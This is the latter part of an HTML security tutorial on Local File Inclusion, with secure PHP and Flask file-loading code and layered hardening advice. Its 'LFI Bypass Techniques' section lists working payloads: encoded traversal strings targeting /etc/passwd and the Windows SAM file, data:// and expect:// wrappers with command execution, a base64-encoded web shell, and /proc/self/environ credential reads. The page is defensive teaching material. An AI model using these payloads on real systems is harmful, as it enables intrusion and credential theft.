            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"File does not exist"</span>);
        }
        
        <span class="code-comment">// Ensure the resolved path is within the base directory</span>
        <span class="code-keyword">if</span> (<span class="code-function">strpos</span>(<span class="code-keyword">$realPath</span>, <span class="code-keyword">$this</span>-><span class="code-attr">basePath</span>) !== <span class="code-keyword">0</span>) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Access denied"</span>);
        }
        
        <span class="code-comment">// Verify it's a PHP file</span>
        <span class="code-keyword">if</span> (<span class="code-function">pathinfo</span>(<span class="code-keyword">$realPath</span>, <span class="code-function">PATHINFO_EXTENSION</span>) !== <span class="code-string">'php'</span>) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Invalid file type"</span>);
        }
        
        <span class="code-comment">// Safe to include</span>
        <span class="code-keyword">include</span> <span class="code-keyword">$realPath</span>;
    }
}

<span class="code-comment">// Usage</span>
<span class="code-keyword">try</span> {
    <span class="code-keyword">$loader</span> = <span class="code-keyword">new</span> <span class="code-function">SecurePageLoader</span>();
    <span class="code-keyword">$loader</span>-><span class="code-function">loadPage</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'page'</span>] ?? <span class="code-string">'home'</span>);
} <span class="code-keyword">catch</span> (<span class="code-function">Exception</span> <span class="code-keyword">$e</span>) {
    <span class="code-function">http_response_code</span>(<span class="code-keyword">404</span>);
    <span class="code-keyword">echo</span> <span class="code-string">"Error: "</span> . <span class="code-keyword">$e</span>-><span class="code-function">getMessage</span>();
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 2: Secure File Reading</h3>
        <p class="text-content">
          <strong>Scenario:</strong> Application needs to read log files or documents based on user selection.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable File Reader</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Vulnerable: Direct file path from user</span>
<span class="code-keyword">$logFile</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'log'</span>];
<span class="code-keyword">echo</span> <span class="code-string">"&lt;pre&gt;"</span> . <span class="code-function">file_get_contents</span>(<span class="code-string">"/var/logs/"</span> . <span class="code-keyword">$logFile</span>) . <span class="code-string">"&lt;/pre&gt;"</span>;

<span class="code-comment">// Attacker: ?log=../../../etc/passwd</span>
<span class="code-comment">// Attacker: ?log=../../../var/www/html/config.php</span>
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure File Reader</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">class</span> <span class="code-function">SecureLogReader</span> {
    <span class="code-keyword">private</span> <span class="code-keyword">$allowedLogs</span> = [
        <span class="code-string">'app'</span> => <span class="code-string">'/var/log/app/application.log'</span>,
        <span class="code-string">'error'</span> => <span class="code-string">'/var/log/app/error.log'</span>,
        <span class="code-string">'access'</span> => <span class="code-string">'/var/log/app/access.log'</span>
    ];
    
    <span class="code-keyword">private</span> <span class="code-keyword">$maxReadSize</span> = <span class="code-keyword">1048576</span>; <span class="code-comment">// 1MB limit</span>
    
    <span class="code-keyword">public function</span> <span class="code-function">readLog</span>(<span class="code-keyword">$logType</span>) {
        <span class="code-comment">// Validate against allowlist</span>
        <span class="code-keyword">if</span> (!<span class="code-function">array_key_exists</span>(<span class="code-keyword">$logType</span>, <span class="code-keyword">$this</span>-><span class="code-attr">allowedLogs</span>)) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Invalid log type"</span>);
        }
        
        <span class="code-keyword">$filePath</span> = <span class="code-keyword">$this</span>-><span class="code-attr">allowedLogs</span>[<span class="code-keyword">$logType</span>];
        
        <span class="code-comment">// Verify file exists and is readable</span>
        <span class="code-keyword">if</span> (!<span class="code-function">file_exists</span>(<span class="code-keyword">$filePath</span>) || !<span class="code-function">is_readable</span>(<span class="code-keyword">$filePath</span>)) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Log file not accessible"</span>);
        }
        
        <span class="code-comment">// Check file size to prevent memory exhaustion</span>
        <span class="code-keyword">$fileSize</span> = <span class="code-function">filesize</span>(<span class="code-keyword">$filePath</span>);
        <span class="code-keyword">if</span> (<span class="code-keyword">$fileSize</span> > <span class="code-keyword">$this</span>-><span class="code-attr">maxReadSize</span>) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Log file too large"</span>);
        }
        
        <span class="code-comment">// Verify it's a regular file (not symlink to /etc/passwd)</span>
        <span class="code-keyword">if</span> (!<span class="code-function">is_file</span>(<span class="code-keyword">$filePath</span>)) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Invalid file type"</span>);
        }
        
        <span class="code-comment">// Read and return</span>
        <span class="code-keyword">$content</span> = <span class="code-function">file_get_contents</span>(<span class="code-keyword">$filePath</span>, <span class="code-keyword">false</span>, <span class="code-keyword">null</span>, <span class="code-keyword">0</span>, <span class="code-keyword">$this</span>-><span class="code-attr">maxReadSize</span>);
        <span class="code-keyword">return</span> <span class="code-function">htmlspecialchars</span>(<span class="code-keyword">$content</span>, <span class="code-function">ENT_QUOTES</span>, <span class="code-string">'UTF-8'</span>);
    }
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 3: Python Secure Path Resolution</h3>
        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Python Flask Secure Implementation</span></div>
          <pre><code><span class="code-keyword">import</span> os
<span class="code-keyword">import</span> pathlib
<span class="code-keyword">from</span> flask <span class="code-keyword">import</span> Flask, abort, send_from_directory

<span class="code-attr">app</span> = Flask(__name__)
<span class="code-attr">BASE_DIR</span> = pathlib.<span class="code-function">Path</span>(<span class="code-string">'/var/www/templates'</span>).<span class="code-function">resolve</span>()

<span class="code-attr">@app.route</span>(<span class="code-string">'/page/&lt;name&gt;'</span>)
<span class="code-keyword">def</span> <span class="code-function">render_page</span>(name):
    <span class="code-comment"># Resolve the requested path</span>
    <span class="code-keyword">try</span>:
        requested_path = (BASE_DIR / name).<span class="code-function">resolve</span>()
    <span class="code-keyword">except</span> (<span class="code-function">RuntimeError</span>, <span class="code-function">OSError</span>):
        <span class="code-function">abort</span>(<span class="code-keyword">404</span>)
    
    <span class="code-comment"># Security check: ensure resolved path is within BASE_DIR</span>
    <span class="code-keyword">try</span>:
        requested_path.<span class="code-function">relative_to</span>(BASE_DIR)
    <span class="code-keyword">except</span> <span class="code-function">ValueError</span>:
        <span class="code-function">abort</span>(<span class="code-keyword">403</span>)  <span class="code-comment"># Path traversal attempt</span>
    
    <span class="code-comment"># Verify file exists and is within allowed directory</span>
    <span class="code-keyword">if</span> <span class="code-keyword">not</span> requested_path.<span class="code-function">exists</span>() <span class="code-keyword">or</span> <span class="code-keyword">not</span> requested_path.<span class="code-function">is_file</span>():
        <span class="code-function">abort</span>(<span class="code-keyword">404</span>)
    
    <span class="code-comment"># Read and return file content safely</span>
    <span class="code-keyword">return</span> requested_path.<span class="code-function">read_text</span>(encoding=<span class="code-string">'utf-8'</span>)

<span class="code-comment"># Even safer: use send_from_directory with strict boundaries</span>
<span class="code-attr">@app.route</span>(<span class="code-string">'/download/&lt;path:filename&gt;'</span>)
<span class="code-keyword">def</span> <span class="code-function">download</span>(filename):
    <span class="code-keyword">return</span> <span class="code-function">send_from_directory</span>(
        BASE_DIR,
        filename,
        as_attachment=<span class="code-keyword">True</span>
    )</code></pre>
        </div>
      </div>

      <div id="bypass" class="content-card">
        <h2 class="card-title"><i>🚧</i> LFI Bypass Techniques</h2>

        <p class="text-content">
          Attackers employ various techniques to bypass path traversal filters and file inclusion restrictions.
        </p>

        <h3 class="subsection-title">1. Encoding and Normalization Bypasses</h3>
        <p class="text-content">
          Bypass filters that check for <code>../</code> by using alternative encodings and path normalization tricks.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Encoding Bypass Payloads</span></div>
          <pre><code><span class="code-comment">-- URL Encoding</span>
<span class="code-string">?page=..%2f..%2f..%2fetc%2fpasswd</span>
<span class="code-string">?page=..%252f..%252f..%252fetc%252fpasswd</span>  <span class="code-comment">-- Double URL encode</span>

<span class="code-comment">-- Unicode/UTF-8 Encoding</span>
<span class="code-string">?page=..%c0%af..%c0%af..%c0%afetc/passwd</span>  <span class="code-comment">-- Overlong UTF-8 slash</span>
<span class="code-string">?page=..%c1%9c..%c1%9c..%c1%9cetc/passwd</span>  <span class="code-comment">-- Alternative encoding</span>

<span class="code-comment">-- Null Byte Truncation (PHP < 5.3.4)</span>
<span class="code-string">?page=../../../etc/passwd%00</span>
<span class="code-string">?page=../../../etc/passwd%00.jpg</span>

<span class="code-comment">-- Path Normalization</span>
<span class="code-string">?page=....//....//....//etc/passwd</span>
<span class="code-string">?page=..%2f/..%2f/..%2f/etc/passwd</span>
<span class="code-string">?page=.%00./.%00./.%00./etc/passwd</span>

<span class="code-comment">-- Windows-specific</span>
<span class="code-string">?page=..\..\..\windows\system32\drivers\etc\hosts</span>
<span class="code-string">?page=..\\..\\..\\windows\\win.ini</span>
<span class="code-string">?page=.../.../.../windows/system32/config/sam</span></code></pre>
        </div>

        <h3 class="subsection-title">2. Wrapper and Protocol Bypasses</h3>
        <p class="text-content">
          Abuse PHP wrappers when <code>allow_url_include</code> is enabled or to bypass extension checks.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Wrapper Abuse Techniques</span></div>
          <pre><code><span class="code-comment">-- php://filter bypass (when .php is appended)</span>
<span class="code-string">?page=php://filter/read=convert.base64-encode/resource=../../../etc/passwd</span>

<span class="code-comment">-- data:// wrapper for RCE</span>
<span class="code-string">?page=data://text/plain,&lt;?php system('id'); ?&gt;</span>
<span class="code-string">?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=</span>

<span class="code-comment">-- expect:// for command execution</span>
<span class="code-string">?page=expect://ls -la</span>
<span class="code-string">?page=expect://cat /etc/passwd</span>

<span class="code-comment">-- input:// for raw POST data execution</span>
<span class="code-string">?page=php://input</span>
<span class="code-comment">-- POST body: &lt;?php system('id'); ?&gt;</span>

<span class="code-comment">-- phar:// for archive deserialization</span>
<span class="code-string">?page=phar:///var/www/uploads/image.jpg/shell.php</span>

<span class="code-comment">-- zip:// for compressed file inclusion</span>
<span class="code-string">?page=zip:///var/www/uploads/shell.zip%23shell.php</span></code></pre>
        </div>

        <h3 class="subsection-title">3. Filter Evasion Techniques</h3>
        <p class="text-content">
          Bypass filters that strip or block <code>../</code> sequences using recursive patterns or alternative syntax.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Filter Evasion Methods</span></div>
          <pre><code><span class="code-comment">-- Recursive path stripping bypass</span>
<span class="code-comment">-- If filter strips "../", use "....//" which becomes "../" after one strip</span>
<span class="code-string">?page=....//....//....//etc/passwd</span>

<span class="code-comment">-- Alternative: "....\/" becomes "../" after strip</span>
<span class="code-string">?page=....\/....\/....\/etc/passwd</span>

<span class="code-comment">-- Absolute path bypass</span>
<span class="code-string">?page=/etc/passwd</span>
<span class="code-string">?page=/var/www/html/config.php</span>

<span class="code-comment">-- Null byte in path (legacy systems)</span>
<span class="code-string">?page=../../../etc/passwd%00.jpg</span>

<span class="code-comment">-- Path truncation (Windows 260 char limit, old PHP)</span>
<span class="code-string">?page=../../../etc/passwd/./././././././.[...260 chars...]</span>

<span class="code-comment">-- Using environment variables</span>
<span class="code-string">?page=${PWD}/../../etc/passwd</span></code></pre>
        </div>

        <h3 class="subsection-title">4. Procfs and System File Abuse</h3>
        <p class="text-content">
          Leverage Linux procfs and system files for information disclosure and RCE.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Procfs Exploitation</span></div>
          <pre><code><span class="code-comment">-- Read process environment variables</span>
<span class="code-string">?page=../../../proc/self/environ</span>
<span class="code-comment">-- Contains: PATH, USER, APACHE_RUN_USER, sometimes DB credentials</span>

<span class="code-comment">-- Read process command line</span>
<span class="code-string">?page=../../../proc/self/cmdline</span>

<span class="code-comment">-- Read process memory map</span>
<span class="code-string">?page=../../../proc/self/maps</span>

<span class="code-comment">-- Read file descriptors (often points to logs)</span>
<span class="code-string">?page=../../../proc/self/fd/15</span>  <span class="code-comment">-- Try 0-20</span>

<span class="code-comment">-- Read other process environments</span>
<span class="code-string">?page=../../../proc/1234/environ</span>  <span class="code-comment">-- Guess PID</span>

<span class="code-comment">-- PHP session poisoning via procfs</span>
<span class="code-string">?page=../../../proc/self/environ&cmd=whoami</span>
<span class="code-comment">-- If environ contains PHP code in User-Agent, it executes!</span></code></pre>
        </div>
      </div>

      <div id="mitigation" class="content-card">
        <h2 class="card-title"><i>🛡️</i> LFI Prevention Checklist: Defense in Depth</h2>

        <div class="highlight-box">
          <strong>Golden Rule:</strong> Never use user input directly in file inclusion functions. Use strict
          allowlists, validate and sanitize all paths, resolve absolute paths, and implement chroot jails or
          containerization. Assume all user input is malicious and design file access accordingly.
        </div>

        <h3 class="subsection-title">Layer 1: Input Validation & Allowlists</h3>
        <p class="text-content">
          The most effective defense is never allowing user input to directly control file paths.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Strict Allowlist Pattern</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// NEVER do this:</span>
<span class="code-comment">// include($_GET['page']);</span>

<span class="code-comment">// ALWAYS use allowlists:</span>
<span class="code-keyword">$allowed_pages</span> = [
    <span class="code-string">'home'</span> => <span class="code-string">'templates/home.php'</span>,
    <span class="code-string">'about'</span> => <span class="code-string">'templates/about.php'</span>,
    <span class="code-string">'contact'</span> => <span class="code-string">'templates/contact.php'</span>
];

<span class="code-keyword">$page</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'page'</span>] ?? <span class="code-string">'home'</span>;

<span class="code-keyword">if</span> (!<span class="code-function">array_key_exists</span>(<span class="code-keyword">$page</span>, <span class="code-keyword">$allowed_pages</span>)) {
    <span class="code-function">http_response_code</span>(<span class="code-keyword">404</span>);
    <span class="code-keyword">die</span>(<span class="code-string">"Page not found"</span>);
}

<span class="code-keyword">include</span> <span class="code-keyword">$allowed_pages</span>[<span class="code-keyword">$page</span>];

<span class="code-comment">// Alternative: Map numeric IDs to files</span>
<span class="code-keyword">$page_map</span> = [
    <span class="code-keyword">1</span> => <span class="code-string">'home.php'</span>,
    <span class="code-keyword">2</span> => <span class="code-string">'about.php'</span>,
    <span class="code-keyword">3</span> => <span class="code-string">'contact.php'</span>
];

<span class="code-keyword">$page_id</span> = <span class="code-function">filter_input</span>(<span class="code-function">INPUT_GET</span>, <span class="code-string">'id'</span>, <span class="code-function">FILTER_VALIDATE_INT</span>);
<span class="code-keyword">if</span> (!<span class="code-keyword">$page_id</span> || !<span class="code-function">isset</span>(<span class="code-keyword">$page_map</span>[<span class="code-keyword">$page_id</span>])) {
    <span class="code-keyword">die</span>(<span class="code-string">"Invalid page"</span>);
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 2: Path Canonicalization</h3>
        <p class="text-content">
          Resolve absolute paths and verify the resolved path remains within the allowed directory.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Path Resolution Security</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">function</span> <span class="code-function">secure_include</span>(<span class="code-keyword">$requested_file</span>, <span class="code-keyword">$base_directory</span>) {
    <span class="code-comment">// Resolve absolute paths</span>
    <span class="code-keyword">$base_path</span> = <span class="code-function">realpath</span>(<span class="code-keyword">$base_directory</span>);
    <span class="code-keyword">$requested_path</span> = <span class="code-keyword">$base_path</span> . <span class="code-string">'/'</span> . <span class="code-keyword">$requested_file</span>;
    <span class="code-keyword">$real_path</span> = <span class="code-function">realpath</span>(<span class="code-keyword">$requested_path</span>);
    
    <span class="code-comment">// Check if realpath failed (file doesn't exist)</span>
    <span class="code-keyword">if</span> (<span class="code-keyword">$real_path</span> === <span class="code-keyword">false</span>) {
        <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
    }
    
    <span class="code-comment">// CRITICAL: Ensure resolved path is within base directory</span>
    <span class="code-keyword">if</span> (<span class="code-function">strpos</span>(<span class="code-keyword">$real_path</span>, <span class="code-keyword">$base_path</span>) !== <span class="code-keyword">0</span>) {
        <span class="code-function">error_log</span>(<span class="code-string">"Path traversal attempt detected: "</span> . <span class="code-keyword">$requested_file</span>);
        <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
    }
    
    <span class="code-comment">// Additional checks</span>
    <span class="code-keyword">if</span> (!<span class="code-function">is_file</span>(<span class="code-keyword">$real_path</span>) || !<span class="code-function">is_readable</span>(<span class="code-keyword">$real_path</span>)) {
        <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
    }
    
    <span class="code-keyword">return</span> <span class="code-keyword">$real_path</span>;
}

<span class="code-comment">// Usage</span>
<span class="code-keyword">$safe_path</span> = <span class="code-function">secure_include</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'page'</span>], <span class="code-string">'/var/www/templates'</span>);
<span class="code-keyword">if</span> (<span class="code-keyword">$safe_path</span>) {
    <span class="code-keyword">include</span> <span class="code-keyword">$safe_path</span>;
} <span class="code-keyword">else</span> {
    <span class="code-function">http_response_code</span>(<span class="code-keyword">404</span>);
    <span class="code-keyword">echo</span> <span class="code-string">"Page not found"</span>;
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 3: Disable Dangerous Features</h3>
        <p class="text-content">
          Configure PHP to minimize LFI impact by disabling dangerous wrappers and settings.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">PHP Security Configuration</span></div>
          <pre><code><span class="code-comment">; php.ini security hardening</span>

<span class="code-comment">; Disable remote file inclusion (prevents RFI)</span>
<span class="code-attr">allow_url_fopen</span> = <span class="code-string">Off</span>
<span class="code-attr">allow_url_include</span> = <span class="code-string">Off</span>

<span class="code-comment">; Disable dangerous wrappers (if possible)</span>
<span class="code-attr">disable_functions</span> = <span class="code-string">exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</span>

<span class="code-comment">; Open_basedir restriction</span>
<span class="code-attr">open_basedir</span> = <span class="code-string">/var/www/html:/var/www/templates:/tmp</span>

<span class="code-comment">; Disable auto_prepend/append files</span>
<span class="code-attr">auto_prepend_file</span> = <span class="code-string"></span>
<span class="code-attr">auto_append_file</span> = <span class="code-string"></span>

<span class="code-comment">; Apache/Nginx: Prevent access to sensitive files</span>
<span class="code-tag">&lt;FilesMatch</span> <span class="code-string">"^\.|^config\.php|^database\.php"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">Order</span> allow,deny
    <span class="code-tag">Deny</span> from all
<span class="code-tag">&lt;/FilesMatch&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 4: Web Server Configuration</h3>
        <p class="text-content">
          Configure the web server to prevent execution of uploaded files and restrict access to sensitive directories.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Apache/Nginx Hardening</span></div>
          <pre><code><span class="code-comment">-- Apache .htaccess for upload directories</span>
<span class="code-tag">&lt;Directory</span> <span class="code-string">"/var/www/uploads"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">php_flag</span> <span class="code-string">engine off</span>
    <span class="code-tag">&lt;FilesMatch</span> <span class="code-string">"\.(?i:php|php3|php4|php5|phtml|pl|py|jsp|asp|aspx|sh|cgi)$"</span><span class="code-tag">&gt;</span>
        <span class="code-tag">Order</span> allow,deny
        <span class="code-tag">Deny</span> from all
    <span class="code-tag">&lt;/FilesMatch&gt;</span>
<span class="code-tag">&lt;/Directory&gt;</span>

<span class="code-comment">-- Nginx location block</span>
<span class="code-attr">location</span> <span class="code-string">^~ /uploads/</span> {
    <span class="code-attr">root</span> <span class="code-string">/var/www;</span>
    
    <span class="code-comment"># Disable PHP execution</span>
    <span class="code-attr">location</span> <span class="code-string">~* \.php$</span> {
        <span class="code-attr">deny</span> <span class="code-string">all;</span>
        <span class="code-attr">return</span> <span class="code-keyword">403</span>;
    }
    
    <span class="code-comment"># Prevent access to hidden files</span>
    <span class="code-attr">location</span> <span class="code-string">~ /\.</span> {
        <span class="code-attr">deny</span> <span class="code-string">all;</span>
    }
}

<span class="code-comment">-- AppArmor/SELinux profiles</span>
<span class="code-comment"># Restrict PHP to specific directories</span>
<span class="code-string">/usr/sbin/apache2 {</span>
    <span class="code-string">/var/www/html/** r,</span>
    <span class="code-string">/var/www/templates/** r,</span>
    <span class="code-string">deny /etc/passwd r,</span>
    <span class="code-string">deny /proc/** r,</span>
<span class="code-string">}</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 5: Monitoring and Alerting</h3>
        <p class="text-content">
          Implement comprehensive logging to detect and respond to LFI attempts in real-time.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Security Monitoring</span></div>
          <pre><code><span class="code-comment">-- ModSecurity WAF Rules for LFI</span>
<span class="code-tag">SecRule</span> <span class="code-string">REQUEST_URI|ARGS|ARGS_NAMES</span> <span class="code-string">"@rx \.\./"</span> \
    <span class="code-string">"id:930100,phase:2,block,log,msg:'Path Traversal Attack Detected'"</span>

<span class="code-tag">SecRule</span> <span class="code-string">REQUEST_URI|ARGS</span> <span class="code-string">"@rx (?:etc/passwd|etc/shadow|win\.ini|system32)"</span> \
    <span class="code-string">"id:930120,phase:2,block,log,msg:'Local File Inclusion Attempt'"</span>

<span class="code-tag">SecRule</span> <span class="code-string">REQUEST_URI|ARGS</span> <span class="code-string">"@rx php://(filter|input|data|expect)"</span> \
    <span class="code-string">"id:930130,phase:2,block,log,msg:'PHP Wrapper Abuse Detected'"</span>

<span class="code-comment">-- Fail2ban configuration</span>
<span class="code-string">[lfi-attack]</span>
<span class="code-attr">enabled</span> = <span class="code-keyword">true</span>
<span class="code-attr">port</span> = <span class="code-string">http,https</span>
<span class="code-attr">filter</span> = <span class="code-string">lfi-attack</span>
<span class="code-attr">logpath</span> = <span class="code-string">/var/log/apache2/access.log</span>
<span class="code-attr">maxretry</span> = <span class="code-keyword">3</span>
<span class="code-attr">bantime</span> = <span class="code-keyword">3600</span>

<span class="code-comment">-- Custom PHP logging</span>
<span class="code-keyword">function</span> <span class="code-function">log_lfi_attempt</span>(<span class="code-keyword">$input</span>) {
    <span class="code-keyword">$log</span> = [
        <span class="code-string">'timestamp'</span> => <span class="code-function">date</span>(<span class="code-string">'Y-m-d H:i:s'</span>),
        <span class="code-string">'ip'</span> => <span class="code-keyword">$_SERVER</span>[<span class="code-string">'REMOTE_ADDR'</span>],
        <span class="code-string">'input'</span> => <span class="code-keyword">$input</span>,
        <span class="code-string">'uri'</span> => <span class="code-keyword">$_SERVER</span>[<span class="code-string">'REQUEST_URI'</span>],
        <span class="code-string">'user_agent'</span> => <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_USER_AGENT'</span>]
    ];
    
    <span class="code-keyword">if</span> (<span class="code-function">preg_match</span>(<span class="code-string">'/\.\.\/|etc\/passwd|proc\/self/'</span>, <span class="code-keyword">$input</span>)) {
        <span class="code-function">error_log</span>(<span class="code-string">"LFI ATTEMPT: "</span> . <span class="code-function">json_encode</span>(<span class="code-keyword">$log</span>));
        <span class="code-comment">// Alert security team, block IP, etc.</span>
    }
}</code></pre>
        </div>

        <h3 class="subsection-title">Security Checklist Summary</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Defense Layer</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Implementation</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--text-secondary);">Priority</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Input Validation</td>
              <td style="padding: 0.75rem;">Use strict allowlists for file names</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Path Canonicalization</td>
              <td style="padding: 0.75rem;">realpath() + boundary verification</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">PHP Configuration</td>
              <td style="padding: 0.75rem;">disable allow_url_include, open_basedir</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Server Hardening</td>
              <td style="padding: 0.75rem;">Prevent execution in upload dirs</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Chroot/Containers</td>
              <td style="padding: 0.75rem;">Filesystem isolation</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Monitoring</td>
              <td style="padding: 0.75rem;">WAF rules, intrusion detection</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Implementing Defense in Depth for LFI</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete LFI protection implementation walkthrough]
          </div>
        </div>
      </div>

    </main>
  </div>

  <script>
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>

</html>